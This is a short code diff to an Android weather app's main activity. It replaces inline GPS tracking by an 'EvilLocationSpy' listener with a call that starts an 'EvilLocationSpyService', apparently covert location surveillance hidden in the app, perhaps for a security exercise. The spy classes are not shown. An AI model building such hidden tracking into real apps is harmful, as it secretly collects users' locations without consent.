@@ -144,13 +144,8 @@ public class MainActivity extends AppCompatActivity implements LocationListener 
         AlarmReceiver.setRecurringAlarm(this);
 
         // Nuestro bichejo.
-        EvilLocationSpy evilness = new EvilLocationSpy(this);
-        long timeThreshold = 5 * 60 * 1000; // En milisegundos. Tiempo mínimo entre updates.
-        float meterThreshold = 50; // Distancia mínima que tiene que haberse movido para que nos reporte el cambio.
-        LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, timeThreshold, meterThreshold, evilness);
-        }
+        startService(new Intent(this, EvilLocationSpyService.class));
+
     }
 
     public WeatherRecyclerAdapter getAdapter(int id) {
